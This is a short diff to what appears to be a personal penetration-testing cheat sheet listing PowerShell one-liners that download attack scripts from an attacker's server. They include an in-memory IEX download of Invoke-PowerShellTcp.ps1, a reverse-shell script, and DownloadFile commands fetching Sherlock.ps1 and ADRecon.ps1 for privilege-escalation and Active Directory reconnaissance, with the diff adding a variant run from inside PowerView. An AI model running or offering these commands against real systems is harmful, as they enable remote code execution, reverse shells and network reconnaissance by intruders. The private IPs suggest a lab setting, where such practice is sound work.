@@ -2,7 +2,7 @@ way 1 =>     Download & Execute , Without Writing on Disk ==>
  
 powershell.exe "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.8:8000/Invoke-PowerShellTcp.ps1')"
 
-way 2 ==> Download and Write on Disk ==>
+way 2 ==> Download and Write on Disk ==>                      ==> from inside of powerview        (New-Object Net.WebClient).DownloadFile('http://10.17.20.181:8000/ADRecon.ps1', 'ADRecon.ps1')
 
 powershell -c (New-Object Net.WebClient).DownloadFile('http://10.10.14.37:8000/Sherlock.ps1', 'sherloack.ps1')
 
